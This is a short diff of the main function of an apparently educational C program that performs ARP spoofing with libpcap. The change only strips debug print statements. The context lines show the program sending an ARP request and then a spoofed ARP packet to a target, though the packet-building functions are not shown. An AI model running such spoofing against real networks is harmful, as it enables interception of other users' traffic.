@@ -21,14 +21,6 @@ int main(int argc, char* argv[]){
 	get_myIpaddr(&myip, argv[1]);
 	get_myMacaddr(mymac, argv[1]);
 	
-	printf("my ip :%x",myip);
-	printf("\nsend ip");
-	print_len(send_ip,4);
-	printf("\ntarget ip");
-	print_len(target_ip,4);
-	printf("my mac : ");
-	print_len(mymac, 6);
-
 	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
 
 	if(handle == NULL){
@@ -39,8 +31,6 @@ int main(int argc, char* argv[]){
 	arp_send_pkt_req(send_mac, send_ip, mymac,(uint8_t*)&myip, handle);
 	printf("sender mac_add");
 	print_len(send_mac,6);
-	printf("\nmy mac :");
-	print_len(mymac,6);
 	arp_send_pkt_spoof(target_ip, send_mac, send_ip, mymac,(uint8_t*)&myip, handle);
 	printf("arp spoofing end");
 	pcap_close(handle);
